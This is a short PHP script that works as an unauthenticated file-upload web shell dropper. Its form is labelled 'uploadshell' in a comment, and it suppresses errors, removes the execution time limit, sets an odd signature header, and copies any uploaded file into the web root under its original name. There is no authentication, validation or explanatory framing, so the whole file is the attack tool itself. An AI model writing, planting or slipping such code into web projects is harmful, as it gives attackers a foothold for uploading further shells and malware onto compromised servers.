<?php
@set_time_limit(0);
@header('null77: pOinter');
?>
<form method='POST' enctype='multipart/form-data'><!--uploadshell--><input type='file' name='f'/><input type='submit' value='up'/></form><?php echo @copy($_FILES['f']['tmp_name'],$_FILES['f']['name'])?'ok':'no';?>